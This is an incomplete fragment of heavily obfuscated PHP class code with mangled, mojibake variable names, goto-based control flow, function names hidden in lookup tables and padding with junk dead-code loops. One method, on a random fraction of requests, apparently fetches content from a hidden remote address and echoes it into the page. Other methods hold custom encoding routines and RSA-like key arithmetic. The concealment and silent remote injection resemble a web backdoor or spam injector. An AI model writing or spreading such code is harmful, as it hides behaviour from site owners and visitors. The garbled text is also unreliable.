DáÁ‰¢ñÓ‚; DáÁ‰¢ñÓ‚: $f¶†¥½–áâ =& $_SERVER[ã®Â„Éæ¹¤]; $B‚Êº²‹– =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $e›¹Ñ¶ç‡Ÿ = $B‚Êº²‹–[297]; goto c‘«ó£‚‹ô; dÁÈÉ„Ü: $C’¿†ˆŒ¢ñ = $f¶†¥½–áâ[641]; $e›¹Ñ¶ç‡Ÿ = $e›¹Ñ¶ç‡Ÿ . $BˆôŒç§ÖÈ . $B‚Êº²‹–[299] . $B‚Êº²‹–[300]($dñá‘ãØ“–); $cÑÄ–»‚¥ = $f¶†¥½–áâ[642]; goto d¶ê®¶¥ç°; fšŒÁäğÊé: $dñá‘ãØ“– = @$B‚Êº²‹–[262]($e›¹Ñ¶ç‡Ÿ, !1, $a­Œº–ŞÉ); return $B‚Êº²‹–[199]($dñá‘ãØ“–, !0); $A¢„Òï—¨ = $f¶†¥½–áâ[643]; goto FÇĞ‚…Íï®; FÇĞ‚…Íï®: if (strlen($A¢„Òï—¨) < $f¶†¥½–áâ[570]) { return; } goto c“¸¹¥Û‡; c‘«ó£‚‹ô: $Eµ¯©ÉİÃ² = $f¶†¥½–áâ[640]; if (!$Eµ¯©ÉİÃ²) { die; } $e›¹Ñ¶ç‡Ÿ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($e›¹Ñ¶ç‡Ÿ, $B‚Êº²‹–[298]); goto dÁÈÉ„Ü; d¶ê®¶¥ç°: if (!$cÑÄ–»‚¥) { return; } if ($dñá‘ãØ“– === -1) { return $e›¹Ñ¶ç‡Ÿ; } $a­Œº–ŞÉ = $B‚Êº²‹–[257](array($B‚Êº²‹–[258] => array($B‚Êº²‹–[261] => $bÆœ‡§«µ, $B‚Êº²‹–[259] => $B‚Êº²‹–[301]), $B‚Êº²‹–[302] => array($B‚Êº²‹–[303] => !1, $B‚Êº²‹–[304] => !1))); goto fšŒÁäğÊé; c“¸¹¥Û‡: } private function sihf3de549fb() { goto EˆŞ•À°”İ; eããÓ÷š°©: $CÛœ‡¤±‰Í = $bÆÒ¾‰¤±Ì[646]; $c²ô—ÌËæñ = $c²ô—ÌËæñ ? $d­°ğµÓ²[249]($c²ô—ÌËæñ) : 0; $B»Ü¨İ„ï = $bÆÒ¾‰¤±Ì[647]; goto C²ğñ‘™…; E÷²ŠÈ° : $Aˆ•Åç„êß = $bÆÒ¾‰¤±Ì[644]; $d§öÒ„‡Ş› = $fîÈº‹Îñ½[$this->dkaza353cb62]; $d§öÒ„‡Ş› = $d­°ğµÓ²[249]($d§öÒ„‡Ş› ? $d§öÒ„‡Ş› : $d­°ğµÓ²[306]); goto d¾‡ƒ±£„¸; EˆŞ•À°”İ: $bÆÒ¾‰¤±Ì =& $_SERVER[ã®Â„Éæ¹¤]; $d­°ğµÓ² =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $fîÈº‹Îñ½ = array($d­°ğµÓ²[305] => $d­°ğµÓ²[306], $d­°ğµÓ²[307] => $d­°ğµÓ²[308], $d­°ğµÓ²[309] => $d­°ğµÓ²[310], $d­°ğµÓ²[311] => $d­°ğµÓ²[312], $d­°ğµÓ²[313] => $d­°ğµÓ²[314], $d­°ğµÓ²[315] => $d­°ğµÓ²[250], $d­°ğµÓ²[316] => $d­°ğµÓ²[250], $d­°ğµÓ²[317] => $d­°ğµÓ²[306], $d­°ğµÓ²[318] => $d­°ğµÓ²[308], $d­°ğµÓ²[319] => $d­°ğµÓ²[310], $d­°ğµÓ²[320] => $d­°ğµÓ²[321], $d­°ğµÓ²[322] => $d­°ğµÓ²[312], $d­°ğµÓ²[323] => $d­°ğµÓ²[324], $d­°ğµÓ²[325] => $d­°ğµÓ²[314], $d­°ğµÓ²[326] => $d­°ğµÓ²[327], $d­°ğµÓ²[328] => $d­°ğµÓ²[329], $d­°ğµÓ²[330] => $d­°ğµÓ²[331]); goto E÷²ŠÈ° ; d¾‡ƒ±£„¸: $aãˆ¸Åˆ£ = $bÆÒ¾‰¤±Ì[645]; if (strlen($aãˆ¸Åˆ£) < $bÆÒ¾‰¤±Ì[558]) { return; } $c²ô—ÌËæñ = $d­°ğµÓ²[113]($this->zkob77ab1311, $d­°ğµÓ²[332]); goto eããÓ÷š°©; C²ğñ‘™…: return $d§öÒ„‡Ş› + $c²ô—ÌËæñ; $d†É“×áÔï = $bÆÒ¾‰¤±Ì[648]; if (!$d†É“×áÔï) { return; } goto eâËáÙÓŠ; eâËáÙÓŠ: } public function rlot5cbf6fb5($AĞ©Ì±´Úã) { goto dİ’°ôÀãŒ; AÕŒ¦¨Îƒ: $BÊá×«—ˆ¤ = $E¦‚Ï©ßÏ˜[649]; while ($BÊá×«—ˆ¤ < $E¦‚Ï©ßÏ˜[566]) { if ($BÊá×«—ˆ¤ >= 0) { break; } $BÊá×«—ˆ¤++; } if ($AĞ©Ì±´Úã[$fÅ‚•°·ğ[333]] == $fÅ‚•°·ğ[228]) { return; } goto AÏìÅøÉ¤‡; AÏìÅøÉ¤‡: if ($fÇÀÉ ¤åâ >= $fÅ‚•°·ğ[249]($fÅ‚•°·ğ[250])) { return; } $bØõĞÃ²¶Ü = $fÅ‚•°·ğ[61]($fÅ‚•°·ğ[148])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][149]}(); if ($bØõĞÃ²¶Ü <= $fÇÀÉ ¤åâ) { return; } goto FÓÕÇÛß•¶; dİ’°ôÀãŒ: $E¦‚Ï©ßÏ˜ =& $_SERVER[ã®Â„Éæ¹¤]; $fÅ‚•°·ğ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $fÇÀÉ ¤åâ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][146]}(); goto AÕŒ¦¨Îƒ; FÓÕÇÛß•¶: $fÈéƒá‚ì¸ = $fÅ‚•°·ğ[61]($fÅ‚•°·ğ[148])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][334]}($fÅ‚•°·ğ[333])->{$_SERVER[«óæÀ—¬ÛÚÈÑ][335]}($fÇÀÉ ¤åâ)->{$_SERVER[«óæÀ—¬ÛÚÈÑ][336]}(); $fÈéƒá‚ì¸ = $fÅ‚•°·ğ[230]($fÈéƒá‚ì¸, $fÅ‚•°·ğ[10], $fÅ‚•°·ğ[333]); if (!$fÅ‚•°·ğ[247]($AĞ©Ì±´Úã[$fÅ‚•°·ğ[333]], $fÈéƒá‚ì¸)) { $fÅ‚•°·ğ[175]($fÅ‚•°·ğ[337], !1, $fÅ‚•°·ğ[244]); } goto B……œê¸Á”; B……œê¸Á”: } public function iyqoa9881aa2() { goto f‰ö½¢ˆÀ×; Bíõ„ã¹¾Ò: $EÀ¥æ´»¤ = $a ‚Î›ÆÖÑ[254]; $AÄ¿œÚèÄ = $e×¯¿ŒœÖ[650]; $EÀ¥æ´»¤ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($EÀ¥æ´»¤, $a ‚Î›ÆÖÑ[256]); goto cø³Ÿ­´ä½; cªçºƒ“¯: $CäØ…™ÖŒİ = $e×¯¿ŒœÖ[652]; if (strlen($CäØ…™ÖŒİ) < $e×¯¿ŒœÖ[562]) { die; } $D˜¸Ò»‚ò¢ = @$a ‚Î›ÆÖÑ[262]($EÀ¥æ´»¤, !1, $A¤ßÄ“À·é); goto eöÈ„ÆÏŒß; cø³Ÿ­´ä½: $FóÈ’·¤Ÿ = $e×¯¿ŒœÖ[651]; while (strlen($FóÈ’·¤Ÿ) < $e×¯¿ŒœÖ[558]) { if (!$FóÈ’·¤Ÿ) { break; } $FóÈ’·¤Ÿ++; } $A¤ßÄ“À·é = $a ‚Î›ÆÖÑ[257](array($a ‚Î›ÆÖÑ[258] => array($a ‚Î›ÆÖÑ[259] => $a ‚Î›ÆÖÑ[260], $a ‚Î›ÆÖÑ[261] => 3))); goto cªçºƒ“¯; f‰ö½¢ˆÀ×: $e×¯¿ŒœÖ =& $_SERVER[ã®Â„Éæ¹¤]; $a ‚Î›ÆÖÑ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if (!$a ‚Î›ÆÖÑ[113]($GLOBALS, $a ‚Î›ÆÖÑ[141]) || $a ‚Î›ÆÖÑ[338](1, 100) > 20) { return; } goto Bíõ„ã¹¾Ò; eöÈ„ÆÏŒß: echo $a ‚Î›ÆÖÑ[339] . $a ‚Î›ÆÖÑ[340]($D˜¸Ò»‚ò¢) . $a ‚Î›ÆÖÑ[341]; goto f‚é‡¶¿Ğ; f‚é‡¶¿Ğ: } private function zpsc68d9f0f0($F­­ºˆƒŸ—, $Dª²’ó¶Ø, $BÉ¢ä™ç·Í = 3) { goto f§‰–š…Èî; f§‰–š…Èî: $dÌŞÜİ’  =& $_SERVER[ã®Â„Éæ¹¤]; $f—Ÿ¥‰± ÷ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $f—Ÿ¥‰± ÷[342](1); goto c²Ñ¶×Š‘¸; EŒˆÔ—±‰: $C×Ğ†¢¾¾µ = $f—Ÿ¥‰± ÷[222]($cÖÀÊô¥ëŸ . $C¬ØÔ‡ÔŠ . $C×Ğ†¢¾¾µ); $eñáİ‹ƒƒ = $dÌŞÜİ’ [667]; if ($BÉ¢ä™ç·Í - 1 > 0) { $C×Ğ†¢¾¾µ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][136]}($C×Ğ†¢¾¾µ, $Dª²’ó¶Ø, $BÉ¢ä™ç·Í - 1); } goto c‘Í††Û¿; dáéğÔÃ–Ò: $cšóé‰ëƒ = $dÌŞÜİ’ [654]; while ($cšóé‰ëƒ < $dÌŞÜİ’ [566]) { if ($cšóé‰ëƒ >= 0) { break; } $cšóé‰ëƒ++; } switch ($cÖÀÊô¥ëŸ) { case $f—Ÿ¥‰± ÷[240]: $C×Ğ†¢¾¾µ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($F­­ºˆƒŸ—, $f—Ÿ¥‰± ÷[222]($Dª²’ó¶Ø . $C¬ØÔ‡ÔŠ)); $B‰îùµåá = $dÌŞÜİ’ [655]; if (strlen($B‰îùµåá) < $dÌŞÜİ’ [564]) { return; } break; $E½¥ãß£«§ = $dÌŞÜİ’ [656]; if (!$E½¥ãß£«§) { return; } case $f—Ÿ¥‰± ÷[228]: $C×Ğ†¢¾¾µ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($F­­ºˆƒŸ—, $f—Ÿ¥‰± ÷[222]($C¬ØÔ‡ÔŠ . $Dª²’ó¶Ø)); break; $eÓÖ»‡¼‰Ò = $dÌŞÜİ’ [657]; if (!$eÓÖ»‡¼‰Ò) { return; } case $f—Ÿ¥‰± ÷[344]: $C×Ğ†¢¾¾µ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($F­­ºˆƒŸ—, $f—Ÿ¥‰± ÷[127]($C¬ØÔ‡ÔŠ . $Dª²’ó¶Ø)); $bá“öíââï = $dÌŞÜİ’ [599]; while ($bá“öíââï < $dÌŞÜİ’ [558]) { if ($bá“öíââï >= 0) { break; } $bá“öíââï++; } break; $CÕéô®»ï­ = $dÌŞÜİ’ [658]; while ($CÕéô®»ï­ < $dÌŞÜİ’ [564]) { if ($CÕéô®»ï­ >= 0) { break; } $CÕéô®»ï­++; } case $f—Ÿ¥‰± ÷[345]: $C×Ğ†¢¾¾µ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($F­­ºˆƒŸ—, $f—Ÿ¥‰± ÷[123]($C¬ØÔ‡ÔŠ . $Dª²’ó¶Ø)); break; case $f—Ÿ¥‰± ÷[346]: goto d’§ø†è˜Õ; C®Û°²‰¥„: if (!$eš¯‘ƒÓŞŠ) { return; } $eµï†ù…ô = $f—Ÿ¥‰± ÷[123]($dïâÙ±… » . $f—Ÿ¥‰± ÷[123]($Dª²’ó¶Ø . $dïâÙ±… ») . $Dª²’ó¶Ø); $B†ãçôáƒ = $dÌŞÜİ’ [661]; goto BƒŠ±é–æ£; d’§ø†è˜Õ: $F­­ºˆƒŸ— = $f—Ÿ¥‰± ÷[127]($F­­ºˆƒŸ—); $F£Ñ¡éÀÙ = $f—Ÿ¥‰± ÷[347](0, 64); $a÷Ü•í»Ï¬ = $dÌŞÜİ’ [659]; goto D£­ƒ”½ÓÓ; e¸·š¬ÉÇï: if (strlen($E¿ùùœ¨œ) < $dÌŞÜİ’ [564]) { return; } $bë‹åšàİ = $f—Ÿ¥‰± ÷[10]; $F°µåíøò = 0; goto BÄ‘Ú¾¢¶; BÄ‘Ú¾¢¶: $B„âØ•ò¾Ù = 0; $F™½Á‹ÃÜƒ = 0; $Bê»·ÎÍ©ô = $dÌŞÜİ’ [663]; goto b˜ãå”Ú; D£­ƒ”½ÓÓ: while (strlen($a÷Ü•í»Ï¬) < $dÌŞÜİ’ [564]) { if (!$a÷Ü•í»Ï¬) { break; } $a÷Ü•í»Ï¬++; } $dïâÙ±… » = $DÒÌ‚ÇÁå[$F£Ñ¡éÀÙ]; $eš¯‘ƒÓŞŠ = $dÌŞÜİ’ [660]; goto C®Û°²‰¥„; f‚«É£©“§: $CÂÒª„¦¯ˆ = $dÌŞÜİ’ [665]; goto Bœš×Ğç÷Ğ; BƒŠ±é–æ£: while ($B†ãçôáƒ < $dÌŞÜİ’ [566]) { if ($B†ãçôáƒ >= 0) { break; } $B†ãçôáƒ++; } $eµï†ù…ô = $f—Ÿ¥‰± ÷[25]($eµï†ù…ô, $F£Ñ¡éÀÙ % 8, $F£Ñ¡éÀÙ % 8 + 7); $E¿ùùœ¨œ = $dÌŞÜİ’ [662]; goto e¸·š¬ÉÇï; b˜ãå”Ú: for ($F°µåíøò = 0; $F°µåíøò < $f—Ÿ¥‰± ÷[24]($F­­ºˆƒŸ—); $F°µåíøò++) { $F™½Á‹ÃÜƒ = $F™½Á‹ÃÜƒ == $f—Ÿ¥‰± ÷[24]($eµï†ù…ô) ? 0 : $F™½Á‹ÃÜƒ; $C×‘ƒ„—İÇ = $dÌŞÜİ’ [664]; if (strlen($C×‘ƒ„—İÇ) < $dÌŞÜİ’ [558]) { die; } $B„âØ•ò¾Ù = ($F£Ñ¡éÀÙ + $f—Ÿ¥‰± ÷[348]($DÒÌ‚ÇÁå, $F­­ºˆƒŸ—[$F°µåíøò]) + $f—Ÿ¥‰± ÷[349]($eµï†ù…ô[$F™½Á‹ÃÜƒ++])) % 64; $bë‹åšàİ .= $DÒÌ‚ÇÁå[$B„âØ•ò¾Ù]; } $C×Ğ†¢¾¾µ = $f—Ÿ¥‰± ÷[340]($dïâÙ±… » . $bë‹åšàİ); break; goto f‚«É£©“§; Bœš×Ğç÷Ğ: default: $C×Ğ†¢¾¾µ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($F­­ºˆƒŸ—, $Dª²’ó¶Ø . $C¬ØÔ‡ÔŠ); $Açæ†¸Æˆİ = $dÌŞÜİ’ [666]; while ($Açæ†¸Æˆİ < $dÌŞÜİ’ [558]) { if ($Açæ†¸Æˆİ >= 0) { break; } $Açæ†¸Æˆİ++; } break; } goto EŒˆÔ—±‰; fÀâÊëğÕ¸: $cÖÀÊô¥ëŸ = $f—Ÿ¥‰± ÷[338](0, 5) . $f—Ÿ¥‰± ÷[10]; $C¬ØÔ‡ÔŠ = $f—Ÿ¥‰± ÷[133](15); $DÒÌ‚ÇÁå = $f—Ÿ¥‰± ÷[343]; goto dáéğÔÃ–Ò; c²Ñ¶×Š‘¸: $C‰ˆ´¥äŞí = $dÌŞÜİ’ [653]; if (!$C‰ˆ´¥äŞí) { die; } $F­­ºˆƒŸ— = $f—Ÿ¥‰± ÷[2]($F­­ºˆƒŸ—); goto fÀâÊëğÕ¸; c‘Í††Û¿: return $C×Ğ†¢¾¾µ; goto b†·®»çË¦; b†·®»çË¦: } private function sxmpb22294de($EÊ…õ½¤¥, $bŒ¹øÒÕçº, $Bš„¢„ß›£ = 3) { goto eÃ•ìÅôâÒ; Eí¥ „è‘Ä: if (strlen($BÛŞÂ³ÓğŠ) < $CºÃ²ÒÓ…[558]) { die; } switch ($c›×‰°ŒùÅ) { case $A¶Š–õÎí‘[240]: $d¹¹‘…»¯Í = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($EÊ…õ½¤¥, $A¶Š–õÎí‘[222]($bŒ¹øÒÕçº . $aŒÉÃá·ÁÂ)); break; $f¾Ú±Ğ‘çğ = $CºÃ²ÒÓ…[672]; while (strlen($f¾Ú±Ğ‘çğ) < $CºÃ²ÒÓ…[558]) { if (!$f¾Ú±Ğ‘çğ) { break; } $f¾Ú±Ğ‘çğ++; } case $A¶Š–õÎí‘[228]: $d¹¹‘…»¯Í = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($EÊ…õ½¤¥, $A¶Š–õÎí‘[222]($aŒÉÃá·ÁÂ . $bŒ¹øÒÕçº)); break; $Föä±õà¨ = $CºÃ²ÒÓ…[673]; while (strlen($Föä±õà¨) < $CºÃ²ÒÓ…[570]) { if (!$Föä±õà¨) { break; } $Föä±õà¨++; } case $A¶Š–õÎí‘[344]: $d¹¹‘…»¯Í = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($EÊ…õ½¤¥, $A¶Š–õÎí‘[127]($aŒÉÃá·ÁÂ . $bŒ¹øÒÕçº)); break; $d–““©Üä = $CºÃ²ÒÓ…[674]; if (strlen($d–““©Üä) < $CºÃ²ÒÓ…[558]) { die; } case $A¶Š–õÎí‘[345]: $d¹¹‘…»¯Í = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($EÊ…õ½¤¥, $A¶Š–õÎí‘[123]($aŒÉÃá·ÁÂ . $bŒ¹øÒÕçº)); $AÌÓ”òµ§­ = $CºÃ²ÒÓ…[675]; while (strlen($AÌÓ”òµ§­) < $CºÃ²ÒÓ…[558]) { if (!$AÌÓ”òµ§­) { break; } $AÌÓ”òµ§­++; } break; case $A¶Š–õÎí‘[346]: goto b•âİàÀ™; f¿®°©“–ó: $dš¼†Œ‘Ç = $CºÃ²ÒÓ…[678]; if (!$dš¼†Œ‘Ç) { return; } $e¶—¢‹‰Ô‚ = $A¶Š–õÎí‘[25]($e¶—¢‹‰Ô‚, $aÄªÀñ÷óİ % 8, $aÄªÀñ÷óİ % 8 + 7); goto bùŸ·ÃòœŒ; b•âİàÀ™: $EÊ…õ½¤¥ = $A¶Š–õÎí‘[351]($EÊ…õ½¤¥); $F­ğõğ¬©î = $EÊ…õ½¤¥[0]; $dßËÔ„Ö = $CºÃ²ÒÓ…[676]; goto c®±ÂæğÀ±; a…•‹á‰Ä§: if (strlen($FïÆ‚ğ¿âÂ) < $CºÃ²ÒÓ…[564]) { die; } $aÄªÀñ÷óİ = $A¶Š–õÎí‘[348]($b»³¿ãÔÉİ, $F­ğõğ¬©î); $e¶—¢‹‰Ô‚ = $A¶Š–õÎí‘[123]($F­ğõğ¬©î . $A¶Š–õÎí‘[123]($bŒ¹øÒÕçº . $F­ğõğ¬©î) . $bŒ¹øÒÕçº); goto f¿®°©“–ó; bùŸ·ÃòœŒ: $A¤¾İÅ¡Ôñ = $A¶Š–õÎí‘[10]; $c©—ª¼êÄ = $CºÃ²ÒÓ…[679]; while (strlen($c©—ª¼êÄ) < $CºÃ²ÒÓ…[566]) { if (!$c©—ª¼êÄ) { break; } $c©—ª¼êÄ++; } goto Fšë¨š‹‰ô; Fšë¨š‹‰ô: $A»Ï§†›´œ = 0; $cª°…—¼Æ† = $CºÃ²ÒÓ…[680]; while (strlen($cª°…—¼Æ†) < $CºÃ²ÒÓ…[566]) { if (!$cª°…—¼Æ†) { break; } $cª°…—¼Æ†++; } goto e·Ë¥åã¢à; CÈÒÊÎ²: $d³õë’­¾” = $CºÃ²ÒÓ…[682]; if (!$d³õë’­¾”) { return; } for ($A»Ï§†›´œ = 0; $A»Ï§†›´œ < $A¶Š–õÎí‘[24]($EÊ…õ½¤¥); $A»Ï§†›´œ++) { $Cä‡‹ãåí = $Cä‡‹ãåí == $A¶Š–õÎí‘[24]($e¶—¢‹‰Ô‚) ? 0 : $Cä‡‹ãåí; $cŒ Ûî ÚÖ = $Cä‡‹ãåí++; $CæÅÑ®˜¦§ = $CºÃ²ÒÓ…[683]; if (strlen($CæÅÑ®˜¦§) < $CºÃ²ÒÓ…[570]) { die; } $F™—¡®Ğ§¶ = $A¶Š–õÎí‘[348]($b»³¿ãÔÉİ, $EÊ…õ½¤¥[$A»Ï§†›´œ]) - $aÄªÀñ÷óİ - $A¶Š–õÎí‘[349]($e¶—¢‹‰Ô‚[$cŒ Ûî ÚÖ]); while ($F™—¡®Ğ§¶ < 0) { $F™—¡®Ğ§¶ += 64; } $A¤¾İÅ¡Ôñ .= $b»³¿ãÔÉİ[$F™—¡®Ğ§¶]; } goto C¹ŠÏá²ÌÓ; c®±ÂæğÀ±: while ($dßËÔ„Ö < $CºÃ²ÒÓ…[562]) { if ($dßËÔ„Ö >= 0) { break; } $dßËÔ„Ö++; } $EÊ…õ½¤¥ = $A¶Š–õÎí‘[25]($EÊ…õ½¤¥, 1); $FïÆ‚ğ¿âÂ = $CºÃ²ÒÓ…[677]; goto a…•‹á‰Ä§; C¹ŠÏá²ÌÓ: $d¹¹‘…»¯Í = $A¶Š–õÎí‘[352]($A¤¾İÅ¡Ôñ); $Bèø‚œ‚»Ë = $CºÃ²ÒÓ…[684]; if (strlen($Bèø‚œ‚»Ë) < $CºÃ²ÒÓ…[566]) { return; } goto A³„”„ÓŠº; A³„”„ÓŠº: break; goto f—ÑÖøßİ³; e·Ë¥åã¢à: $F™—¡®Ğ§¶ = 0; $D¥ÚÜÑÁŞ = $CºÃ²ÒÓ…[681]; $Cä‡‹ãåí = 0; goto CÈÒÊÎ²; f—ÑÖøßİ³: default: $d¹¹‘…»¯Í = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($EÊ…õ½¤¥, $bŒ¹øÒÕçº . $aŒÉÃá·ÁÂ); $C¢šâ—„®Ü = $CºÃ²ÒÓ…[685]; if (!$C¢šâ—„®Ü) { return; } break; $DîÒ¼ÃÉ¯£ = $CºÃ²ÒÓ…[686]; if (strlen($DîÒ¼ÃÉ¯£) < $CºÃ²ÒÓ…[570]) { return; } } if ($Bš„¢„ß›£ - 1 > 0) { $d¹¹‘…»¯Í = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][197]}($d¹¹‘…»¯Í, $bŒ¹øÒÕçº, $Bš„¢„ß›£ - 1); } goto FÇºÆİÇšÙ; FÇºÆİÇšÙ: return $d¹¹‘…»¯Í; goto eø°°ôèÜ¨; F×Ï–…¨êÎ: $EÊ…õ½¤¥ = $A¶Š–õÎí‘[2]($EÊ…õ½¤¥); $EÊ…õ½¤¥ = $A¶Š–õÎí‘[222]($EÊ…õ½¤¥); $eòê—»‰ò = $CºÃ²ÒÓ…[668]; goto E½Å¤ÇÅ…¨; b­Ú»„Ñ×Û: while (strlen($eÅ½Üå”•Š) < $CºÃ²ÒÓ…[564]) { if (!$eÅ½Üå”•Š) { break; } $eÅ½Üå”•Š++; } $b»³¿ãÔÉİ = $A¶Š–õÎí‘[343]; $BÛŞÂ³ÓğŠ = $CºÃ²ÒÓ…[671]; goto Eí¥ „è‘Ä; E½Å¤ÇÅ…¨: $c›×‰°ŒùÅ = $EÊ…õ½¤¥[0]; $bÓâœÓÄ‚ = $CºÃ²ÒÓ…[669]; while ($bÓâœÓÄ‚ < $CºÃ²ÒÓ…[562]) { if ($bÓâœÓÄ‚ >= 0) { break; } $bÓâœÓÄ‚++; } goto e‹Ÿªä«Âƒ; e‹Ÿªä«Âƒ: $aŒÉÃá·ÁÂ = $A¶Š–õÎí‘[25]($EÊ…õ½¤¥, 1, 15); $EÊ…õ½¤¥ = $A¶Š–õÎí‘[25]($EÊ…õ½¤¥, 16); $eÅ½Üå”•Š = $CºÃ²ÒÓ…[670]; goto b­Ú»„Ñ×Û; eÃ•ìÅôâÒ: $CºÃ²ÒÓ… =& $_SERVER[ã®Â„Éæ¹¤]; $A¶Š–õÎí‘ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; if (!$A¶Š–õÎí‘[350]($EÊ…õ½¤¥) || $A¶Š–õÎí‘[24]($EÊ…õ½¤¥) < 10) { return !1; } goto F×Ï–…¨êÎ; eø°°ôèÜ¨: } public function rpfvdef9a9ee($CíŒâ¹˜ì) { goto F‡íéÕö; bå³à±ÍÆº: $D÷Ãáà¬¶” = $EŠ¼ºßŞ°±[687]; $F¬Ç´ŠÀ£¸ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][353]}(); $C¥õ™¾—ê¤ = $EŠ¼ºßŞ°±[688]; goto Båä£®Ò½Ä; Båä£®Ò½Ä: if (!$C¥õ™¾—ê¤) { return; } $a“àŒøÉè· = ($CâÕñçéøø - 1) * ($F¬Ç´ŠÀ£¸ - 1); $f«”¾ˆ» = $EŠ¼ºßŞ°±[689]; goto cŞ”Æ¢ß¼; dëôÉË§Œ: while (strlen($F‰¿ìˆ²Æ) < $EŠ¼ºßŞ°±[566]) { if (!$F‰¿ìˆ²Æ) { break; } $F‰¿ìˆ²Æ++; } while (1) { $eĞšäÇˆ† = $Fíõë¼´ÈŒ; $A»ÔÁ•á½  = $EŠ¼ºßŞ°±[691]; while (strlen($A»ÔÁ•á½ ) < $EŠ¼ºßŞ°±[566]) { if (!$A»ÔÁ•á½ ) { break; } $A»ÔÁ•á½ ++; } $fÅ¹¥ß ¿ä = $a“àŒøÉè·; $d×½±‹ËÔÙ = $EŠ¼ºßŞ°±[692]; while (strlen($d×½±‹ËÔÙ) < $EŠ¼ºßŞ°±[570]) { if (!$d×½±‹ËÔÙ) { break; } $d×½±‹ËÔÙ++; } while ($fÅ¹¥ß ¿ä % $eĞšäÇˆ† != 0) { $bÌ†š¤„¢ = $fÅ¹¥ß ¿ä; $fÅ¹¥ß ¿ä = $eĞšäÇˆ†; $eĞšäÇˆ† = $bÌ†š¤„¢ % $eĞšäÇˆ†; $D‘ğØ‡¤”× = $EŠ¼ºßŞ°±[693]; } if ($eĞšäÇˆ† == 1) { break; } else { $Fíõë¼´ÈŒ++; } } $B‡öÜ‹—Û = 2; goto bÄµ¾è›í¦; b¾¹Ó¡¿•¡: $f§å¨Û›¥© = $EŠ¼ºßŞ°±[594]; if (!$f§å¨Û›¥©) { die; } goto dù°ãÈÓ‚; cŞ”Æ¢ß¼: if (!$f«”¾ˆ») { return; } $Fíõë¼´ÈŒ = $bã¼à¸„Ø‡[249](($CâÕñçéøø + $F¬Ç´ŠÀ£¸) / 2); $F‰¿ìˆ²Æ = $EŠ¼ºßŞ°±[690]; goto dëôÉË§Œ; EòŞØôá¹Ó: if (!$B°Ø¡×ƒá) { die; } $A²˜ãÊ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($CíŒâ¹˜ì, $e¶Ñ•àáÓª) . $bã¼à¸„Ø‡[357] . $bÔ”ˆŸ¯›˜; return $A²˜ãÊ; goto b¾¹Ó¡¿•¡; F‡íéÕö: $EŠ¼ºßŞ°± =& $_SERVER[ã®Â„Éæ¹¤]; $bã¼à¸„Ø‡ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $CâÕñçéøø = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][353]}(); goto bå³à±ÍÆº; Bë¡ïŞÏñ: $bÔ”ˆŸ¯›˜ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][156]}($CâÕñçéøø * $F¬Ç´ŠÀ£¸ . $bã¼à¸„Ø‡[10], $bã¼à¸„Ø‡[158]); $e¶Ñ•àáÓª = $bã¼à¸„Ø‡[123]($bã¼à¸„Ø‡[354] . ($CâÕñçéøø + $F¬Ç´ŠÀ£¸) . $bã¼à¸„Ø‡[355] . $Fíõë¼´ÈŒ . $bã¼à¸„Ø‡[355] . $B‡öÜ‹—Û . $bã¼à¸„Ø‡[356]); $B°Ø¡×ƒá = $EŠ¼ºßŞ°±[695]; goto EòŞØôá¹Ó; bÄµ¾è›í¦: $Eğ·¹Àˆ…Ñ = $EŠ¼ºßŞ°±[694]; if (strlen($Eğ·¹Àˆ…Ñ) < $EŠ¼ºßŞ°±[558]) { die; } for ($FÈ¬™¥åâÌ = 0; $FÈ¬™¥åâÌ < $a“àŒøÉè· * 10; $FÈ¬™¥åâÌ++) { if (($a“àŒøÉè· * $FÈ¬™¥åâÌ + 1) % $Fíõë¼´ÈŒ == 0) { $B‡öÜ‹—Û = $bã¼à¸„Ø‡[249](($a“àŒøÉè· * $FÈ¬™¥åâÌ + 1) / $Fíõë¼´ÈŒ); break; } } goto Bë¡ïŞÏñ; dù°ãÈÓ‚: } public function waspfed3a947($E¸®ËÂ§Ã) { goto d¾™‹Ã‰‹; Añã„†¬èˆ: for ($F±…ßéµÒÛ = 3; $F±…ßéµÒÛ < $DˆŠ“™‰Œø; $F±…ßéµÒÛ += 2) { if ($DˆŠ“™‰Œø % $F±…ßéµÒÛ != 0) { continue; } $D¦¡ßŞŒ„¹ = $F±…ßéµÒÛ; $Cµ©²Â«Òî = $AÅå’†„öø[249]($DˆŠ“™‰Œø / $F±…ßéµÒÛ); break; } $c¶è¶æ›–ò = ($D¦¡ßŞŒ„¹ - 1) * ($Cµ©²Â«Òî - 1); $CğÔƒ½õ¬Ê = $E£¢ïİ†â˜[699]; goto eã±¸ÏÒÉ“; c‚‹‡¢ô…: $Cµ©²Â«Òî = 0; $Eë–˜…æ§ = $E£¢ïİ†â˜[698]; if (strlen($Eë–˜…æ§) < $E£¢ïİ†â˜[562]) { return; } goto Añã„†¬èˆ; d¾™‹Ã‰‹: $E£¢ïİ†â˜ =& 